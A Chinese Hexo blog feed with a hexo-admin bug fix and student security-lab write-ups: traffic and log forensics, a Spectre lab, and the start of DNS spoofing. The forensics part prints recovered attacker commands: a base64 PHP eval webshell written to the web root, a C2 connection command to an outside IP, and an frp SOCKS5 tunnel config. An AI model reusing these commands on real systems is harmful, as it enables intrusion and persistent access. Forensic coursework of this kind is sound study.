是一个错误信息，它通常出现在Unix和Linux系统中，当你尝试执行一个命令或者程序时，系统无法正确地执行这个操作。spawn 是一个函数，用于创建一个新的进程，而 EINVAL 是一个错误码，表示“无效的参数”。<br><br>在这个上下文中，spawn EINVAL 通常意味着以下几种情况之一：<br><br><span class="hljs-bullet">1.</span> 无效的命令：你尝试执行的命令不存在或者命令的路径不正确。<br><span class="hljs-bullet">2.</span> 文件权限问题：你可能没有足够的权限去执行某个文件或者命令。<br><span class="hljs-bullet">3.</span> 路径问题：提供给 spawn 函数的路径可能不正确，或者包含了无效的字符。<br><span class="hljs-bullet">4.</span> 环境问题：环境变量可能没有正确设置，导致 spawn 函数无法找到正确的执行路径。<br></code></pre></td></tr></table></figure><p><font color='yellow'>具体来说，是<code>hexo-admin</code>的<code>deploy.js</code>第14行，<code>spawn</code>函数调用失败</font></p><hr><p>搜到了一个<a href="https://www.soinside.com/question/kGNdMTXjw9GnnYojay6CpW">问答</a>，其中说由于Node.js的安全更新，在win下，如果需要调用<code>spawn</code>引用<code>.bat</code>或<code>.cmd</code>文件，需要声明：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123; <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure><p>以此作为选项传递，以防止发生 EINVAL 错误。</p><hr><p>所以原来的<code>./node_modules/hexo-admin/deploy.js</code>第14行，调用<code>spawn</code>函数的一行中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> proc = <span class="hljs-title function_">spawn</span>(command, [message], &#123;<span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>&#125;);<br></code></pre></td></tr></table></figure><p>修改为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> proc = <span class="hljs-title function_">spawn</span>(command, [message], &#123; <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span> &#125;, &#123;<span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>&#125;);<br></code></pre></td></tr></table></figure><p>再重新加载一遍Hexo Admin Server，点击<code>Deploy</code>就能成功了！</p>]]></content>
    
    
    <categories>
      
      <category>study-else</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo-Admin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WaterMark</title>
    <link href="/2024/12/27/watermark/"/>
    <url>/2024/12/27/watermark/</url>
    
    <content type="html"><![CDATA[<h1>如何对图床中的图片添加水印</h1><p>研究了一晚上有关水印的问题。</p><p>本来是想要给上传至博客中的图片添加水印，搜了很久只找到了对hexo的静态图片添加水印的插件，而且也没有尝试成功。</p><p>想了一下似乎可以对图床中的图片添加水印，然后发现之前用的picgo似乎已经太老套了。</p><p>现在比较新的是使用piclist，并且piclist可以对picgo图床相册进行一键导入，还可以根据时间戳对图片进行重命名（就不用担心重复使用照片会报错了）。</p><hr><p>尝试使用piclist进行文字水印，失败；</p><p>尝试图片水印很快就成功了，透明底的话和文字也差不多效果。</p><p><strong>成功解决水印问题！</strong></p>]]></content>
    
    
    <categories>
      
      <category>study-else</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WaterMark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Finally</title>
    <link href="/2024/12/26/finally/"/>
    <url>/2024/12/26/finally/</url>
    
    <content type="html"><![CDATA[<p>终于把想放上去的作业放完了。。为什么这么无聊还不复习！</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab 13</title>
    <link href="/2024/12/26/lab13/"/>
    <url>/2024/12/26/lab13/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 13-溯源与取证分析实验</h1><p><em>思考过程简略，因为有所借鉴。。。</em></p><hr><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 溯源取证分析作为网络攻防过程中重要环节，准确找到攻击者的入侵线索(尤其是攻击突破口、攻击IP地址、域名、工具等信息)，对于企业或者团队安全运营团队来说都是必备技能。常规攻击取证过程中往往会结合流量、Web访问日志、终端系统或者软件日志等信息来挖掘或者推断相关线索。本实验通过网络流量、日志等溯源环境进行真实案例模仿，通过实战化分析来锻炼学生的取证溯源能力，从而加深大家对于网络攻防的实战化水平。在本实验结束时，学生应该能够具备对网络流量和日志的基本分析能力。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="Task1-Webshell数据包-webshell-zip">Task1 Webshell数据包(webshell.zip)</h4><p>小张单位网站被黑客挂马，请从流量中分析出webshell，并进行回答：</p><p>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</p><p>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</p><hr><h5 id="问题分析">问题分析</h5><ol><li><p>搜索login，在No.101发现很轻易就拿到了输入的用户名和密码</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112958107.png" alt=""></p></li><li><p>因为知道是用了webshell攻击，所以肯定是执行了system命令的，搜了一下发现了返回’a’</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113005130.png" alt=""></p></li><li><p>但是后面的system对应的参数都是aaa，执行了下述这些命令</p><ol><li><p>system(‘whoami’);</p><p>获取当前程序运行的用户</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113016118.png" alt=""></p></li><li><p>system(‘ipconfig’);</p><p>显示当前计算机的网络配置信息</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113027296.png" alt=""></p></li><li><p>system(‘pwd’);</p><p>显示当前工作目录</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113035463.png" alt=""></p></li><li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d’);</p><p>将这段字符串用base64解码后，发现为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个明显的恶意代码，若写入web服务器的php文件后，可以用蚁剑连接拿到shell</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113043324.png" alt=""></p></li><li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php’);</p><p>果然，这里就执行了</p><p>在web服务器的 <code>/var/www/html</code> 目录下生成了一个文件 <code>1.php</code>，内容为上述的恶意代码</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113051901.png" alt=""></p></li></ol></li><li><p>继续跟踪<code>aaa</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113059479.png" alt=""></p><ol><li><p>第一个item可以看出是明显的蚁剑连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;&#125;;.....<br></code></pre></td></tr></table></figure></li><li><p>第二个item中的值进行base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/www/html/frpc.ini<br></code></pre></td></tr></table></figure><p>表示将路径 <code>/var/www/html/frpc.ini</code> 作为表单数据提交，即 将<code>frpc.ini</code>文件上传到服务器上，<font color='green'>攻击者能够通过这个文件访问服务器内的资源</font></p></li><li><p>第三个item中的值进行解析，这是一个ASCII编码，解码后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">[common]<br>server_addr = <span class="hljs-number">192.168</span>.<span class="hljs-number">239.123</span><br>server_port = <span class="hljs-number">7777</span><br>token = Xa3BJf2l5enmN6Z7A8mv<br><br>[test_sock5]<br>type = tcp<br>remote_port = <span class="hljs-number">8111</span><br>plugin = socks5<br>plugin_user = <span class="hljs-number">0</span>HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br>use_encryption = <span class="hljs-literal">true</span><br>use_compression = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>可以拿到SOCKS5的user和passwd字段</p></li></ol></li></ol><hr><h5 id="A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。">A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</h5><p><font color='red'>（分析过程见上）</font></p><ol><li><p>登录系统</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113109222.png" alt=""></p></li><li><p>写入webshell</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113117037.png" alt=""></p></li><li><p>使用蚁剑进行连接，拿到webshell并进行操作</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113124224.png" alt=""></p></li></ol><hr><h5 id="B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。">B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</h5><p><font color='red'>（分析过程见上）</font></p><ol><li><p>登录使用的账号、密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">username: test<br>password: Admin123!@#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113131503.png" alt=""></p></li><li><p>SOCKS5的账号、密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">plugin_user = 0HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113138922.png" alt=""></p></li></ol><hr><h4 id="Task2-日志分析-日志分析-zip">Task2 日志分析(日志分析.zip)</h4><p>小明发现单位某应用程序被攻击后提取了对应的日志数据，请分析日志并进行作答：</p><h5 id="A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图">A.  网络存在源码泄漏，<strong>源码文件名是什么</strong>？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)</h5><ol><li><p>直接在日志中以状态码200看一下攻击者成功访问了哪些文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113145574.png" alt=""></p><p>发现有<code>www.zip</code>，这是网站备份文件，本来不应该是普通用户能够访问的，所以网站应该泄露的就是<code>www.zip</code>文件</p></li></ol><p><strong>网站泄露的是<code>www.zip</code>文件</strong></p><hr><h5 id="B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图">B.  分析攻击流量，黑客往/tmp目录写入一个文件，<strong>文件名是什么</strong>？(请对流量分析进行截图)</h5><ol><li><p>在日志中搜索’tmp’</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113153263.png" alt=""></p><p>攻击者尝试访问<code>/tmp/sess_car</code>文件，并往其中写入了一段序列化的php代码</p><p>如果服务器对 <code>/tmp/sess_car</code> 文件执行反序列化操作，攻击者可以伪造数据触发 <code>call_user_func_array</code>，调用任意函数</p></li></ol><p><strong>写入的是<code>sess_car</code>文件</strong></p><hr><h5 id="C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？">C.  分析攻击流量，黑客使用的是<strong>什么漏洞</strong>读取了秘密文件？</h5><ol><li><p>SplFileObject漏洞，当使用反序列化操作时，可以利用SplFileObject来触发一些安全漏洞</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113159425.png" alt=""></p></li></ol><hr><h4 id="Task3-攻击“苹果”注入-ios-zip">Task3 攻击“苹果”注入(ios.zip)</h4><p>一位苹果安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p><p>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</p><p>B.  黑客所控制的C&amp;C服务器IP是什么？</p><p>C.  被害者手机上被拿走了的私钥文件内容是什么？</p><hr><h5 id="问题分析-v2">问题分析</h5><ol><li><p>在日志中搜索<code>php</code>，发现了<code>ma.php</code>，看起来很明显是一个植入的木马文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113206320.png" alt=""></p></li><li><p>第一个访问中有<code>fxxk=system(base64_decode(%27d2hvYW1p%27));</code></p><p>这表示攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>并且已经执行成功了，返回’200’，说明木马植入成功</strong></p></li><li><p>打开pcap文件，发现在第15条tcp流时，<strong>攻击者下载了一个文件<code>Stowaway</code></strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113213190.png" alt=""></p><p><code>Stowaway</code>是一个内网穿透工具，能够使攻击者通过这个文件访问用户中的所有文件</p></li><li><p>在这条流中搜索’ios_agent’，发现执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113220144.png" alt=""></p><p>也就是说攻击者主机IP是 <code>3.128.156.159</code>，使用的加密密钥是<code>hack4sec</code></p></li><li><p>文件中的流量被加密了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113227013.png" alt=""></p></li><li><p>使用实验中给到的<code>keylog.txt</code>密钥文件进行解密</p><p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;(Pre)-Master-Secret log filename-&gt;浏览…</p><p>将<code>keylog.txt</code>加载进去</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113234094.png" alt=""></p></li><li><p>筛选出http2流量，发现有明显的sql注入攻击</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113241509.png" alt=""></p><p><strong>确实是布尔注入</strong></p></li><li><p>进行端口扫描，在端口扫描时，大多数端口会显示关闭，返回RST，可以在专家模式中找到RST的最大和最小端口确定端口扫描范围</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113248670.png" alt=""></p></li></ol><hr><h5 id="A-简述黑客的整个攻击过程，关键步骤请配图说明。">A.  简述黑客的整个攻击过程，关键步骤请配图说明。</h5><ol><li><p>以3.128.156.159作为C&amp;C服务器，在192.168.1.8安装ios_agent，并执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>控制主机</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113255246.png" alt=""></p></li><li><p>对192.168.1.8进行SQL注入攻击，获取敏感信息</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113302136.png" alt=""></p></li><li><p>进行端口扫描</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113309050.png" alt=""></p></li><li><p>向主机中植入木马，写入webshell</p><p>攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113316461.png" alt=""></p></li></ol><h5 id="B-黑客所控制的C-C服务器IP是什么？">B.  黑客所控制的C&amp;C服务器IP是什么？</h5><ol><li><p>从上述可知，执行命令为<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>，即攻击者控制的ip为<code>3.128.156.159</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113322120.png" alt=""></p></li></ol><hr><h5 id="C-被害者手机上被拿走了的私钥文件内容是什么？">C.  被害者手机上被拿走了的私钥文件内容是什么？</h5><ol><li><p><s>通过sql注入命令，可以知道攻击者在一个个尝试密码中的每一个字符。并且黑客遍历每一个字符的顺序为0x2B、0x2D、0x7B、0x7D、0x30……</s></p><p>依次这样分析剩下的所有数据包即可获得所有的16进制值</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">37343635386633206338343120343536642038356437206436633066656461626232<br></code></pre></td></tr></table></figure></li><li><p>解码16进制后得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">746558f3-c841-456b-85d7-d6c0f2edabb2<br></code></pre></td></tr></table></figure></li></ol><p>即得到敏感信息为<code>746558f3-c841-456b-85d7-d6c0f2edabb2</code></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 12</title>
    <link href="/2024/12/26/lab12/"/>
    <url>/2024/12/26/lab12/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 12-幽灵攻击实验</h1><p><em>按照真实情况截图的，没有成功就没有成功了</em></p><hr><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，除非更换CPU。幽灵和熔断漏洞代表了CPU设计中的一种特殊类型的漏洞，它们还为安全教育提供了宝贵的一课。本实验的学习目标是让学生获得幽灵攻击的第一手经验。攻击本身非常复杂，因此我们将其分解为几个小步骤，每个步骤都是易于理解和执行。一旦学生理解了每一步，就不难理解了把所有的东西放在一起进行实际的攻击。本实验涵盖了以下内容：- 幽灵攻击- 侧通道攻击- CPU缓存- CPU微体系结构内的无序执行和分支预测 --><hr><h3 id="实验步骤">实验步骤</h3><p>崩溃和幽灵攻击都使用CPU缓存作为一个侧通道来窃取一个受保护的秘密，使用的技术为刷新+重加载。</p><p>当CPU获取数据时，通常先访问CPU Cache，CPU Cache中未找到，再访问主存Main Memory。</p><p>因此，当CPU需要获取数据时，首先查看CPU Cache，如果缓存命中，将直接获取；如果未命中，CPU将进入Main Memory获取数据。CPU Cache会比访问Main Memory快很多。</p><h4 id="Task-1-＆-Task-2-Side-Channel-Attacks-via-CPU-Caches">Task 1 ＆ Task 2: Side Channel Attacks via CPU Caches</h4><h5 id="Task-1-Reading-from-Cache-versus-from-Memory">Task 1: Reading from Cache versus from Memory</h5><p>编译<code>CacheTime.c</code>并输出，查看CPU获取不同数据的访问时间，用以得到访问CPU Cache和Main Memory的时间：</p><ol><li><p>第一次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112112731.png" alt=""></p></li><li><p>第二次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112122905.png" alt=""></p></li><li><p>第三次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112133209.png" alt=""></p></li></ol><p><strong>可以初步判定，80次CPU访问时间以内的，大概率是访问CPU Cache；</strong></p><p><strong>而次数较大的，大概率是访问主存。</strong></p><hr><h5 id="Task-2-Using-Cache-as-a-Side-Channel">Task 2: Using Cache as a Side Channel</h5><p>编译20次<code>FlushReload.c</code>并输出，将CPU Cache中缓存的值读取出来，即该值为victim函数调用的值，因为前面已经确认阈值为<code>80</code>了，所以没有更改<code>FlushReload.c</code>中的阈值：</p><p><font color='red'>（这里只截取5次的结果，都是正确输出）</font></p><ol><li><p>一次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112141311.png" alt=""></p></li><li><p>二次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112146606.png" alt=""></p></li><li><p>三次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112152782.png" alt=""></p></li><li><p>四次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112157980.png" alt=""></p></li><li><p>五次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112203841.png" alt=""></p></li></ol><p><strong>可以看到都是正确输出94，说明CPU Cache中存入的值为94，即得到Secret的值。</strong></p><hr><h4 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction">Task 3: Out-of-Order Execution and Branch Prediction</h4><ol><li><p>直接编译执行<code>SpectreExperiment.c</code>，模拟在侧通道中可能会有噪声的情况时，即CPU缓存了一些额外的东西，能否获取到Secret的值</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112209978.png" alt=""></p><p><strong>可以看到还是能成功获取的。</strong></p></li><li><p>注释掉以下的代码，会导致CPU的分支预测器不会受到干扰，从而使得侧信道攻击无法成功执行</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112216177.png" alt=""></p></li><li><p>但不知道为什么我编译之后还是可以得到Secret，可能是因为CPU缓存预取机制使得能够探测到缓存状态变化（不太明白）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112222879.png" alt=""></p></li><li><p>取消注释上述行，修改代码中箭头所指的部分，将传入的值修改为20-29</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112230301.png" alt=""></p></li><li><p>编译执行后，可以看到攻击不成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112236663.png" alt=""></p><p>这是因为把传入的值修改为20-29后，分支语句多次执行false，导致训练的结果是CPU会预测执行false语句，所以没有执行分支</p></li></ol><p><strong>task3完成！</strong></p><hr><h4 id="Task-4-The-Spectre-Attack">Task 4: The Spectre Attack</h4><ol><li><p>编译执行<code>SpectreAttack.c</code>，利用分支预测获取Secret值</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112242944.png" alt=""></p><p><strong>可以看到都能正确获得秘密值，攻击成功！</strong></p></li></ol><p><strong>task4完成！</strong></p><hr><h4 id="Task-5-Improve-the-Attack-Accuracy">Task 5: Improve the Attack Accuracy</h4><ol><li><p>直接编译执行<code>SpectreAttackImprove.c</code>，发现多次并不能返回正确的值</p><p>第一次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112249536.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112254734.png" alt=""></p><p>第二次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112259939.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112304767.png" alt=""></p><p>第三次：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112311585.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112317055.png" alt=""></p><p><font color='green'>都没有返回正确的值</font></p></li><li><p>尝试修改<code>SpectreAttackImprove.c</code>文件，只有当 s 不为零时，才会对数组 array 的特定位置进行修改，即确保只对包含敏感信息的内存位置进行修改，会更容易拿到Secret的值</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112322591.png" alt=""></p></li><li><p>再次编译执行</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112328973.png" alt=""></p><p>结果</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112335775.png" alt=""></p><p><strong>果然拿到了！</strong></p></li><li><p>注释掉这一行，hit的值降低，也会拿不到Secret的值</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112341364.png" alt=""></p></li><li><p>重新编译执行</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112607048.png" alt=""></p><p><strong>发现果然hit的值变小，而且无法拿到Secret的值了</strong></p></li><li><p>修改usleep的值，程序的睡眠时间影响攻击的成功率，可能因为时间变长后，判断语句已经返回结果，不需要进行分支预测，也就无法攻击成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112623688.png" alt=""></p></li><li><p>以下为不同usleep值的运行结果</p><ol><li><p>usleep(100)</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112640734.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112646650.png" alt=""></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(1000)</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112655029.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112702247.png" alt=""></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(10000)</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112709119.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112714767.png" alt=""></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(100000)</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112720880.png" alt=""></p><p><strong>终于攻击失败了</strong></p></li></ol></li></ol><p><strong>task5完成！</strong></p><hr><h4 id="Task-6-Steal-the-Entire-Secret-String">Task 6: Steal the Entire Secret String</h4><ol><li><p>创建<code>task6.c</code>，用于窃取CPU Cache中的所有值（完整代码见源代码）</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112726384.png" alt=""></p></li><li><p>编译后执行</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112733564.png" alt=""></p></li><li><p>以下是执行几次后的结果</p><ol><li><p>第一次</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112740328.png" alt=""></p><p>输出不完整</p></li><li><p>第二次</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112747395.png" alt=""></p><p>输出不完整</p></li><li><p>第三次</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112754270.png" alt=""></p><p>输出不完整</p></li><li><p>中间几次省略，第七次</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112801167.png" alt=""></p><p><strong>除了第一个字符其他都完整输出了</strong></p></li></ol></li></ol><p><strong>task6完成！</strong></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 11</title>
    <link href="/2024/12/26/lab11/"/>
    <url>/2024/12/26/lab11/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 11-DNS欺骗实验</h1><p><em>远程DNS攻击的后两个task有虚假嫌疑。。。</em></p><hr><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="Local-DNS-Attack-Lab"><strong>Local DNS Attack Lab</strong></h4><h5 id="环境搭建">环境搭建</h5><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105732027.png" alt=""></p><h6 id="docker">docker</h6><ol><li><p>加载镜像</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105739487.png" alt=""></p></li><li><p>创建docker容器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105744586.png" alt=""></p></li><li><p>开启容器</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226105750218.png" alt=""></p></li><li><p>测试Local DNS Serve中是否能正确运行bind9</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rndc status<br></code></pre></td></tr></table></figure><p>如果报错，可能是没有生成rndc的配置文件和密钥，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 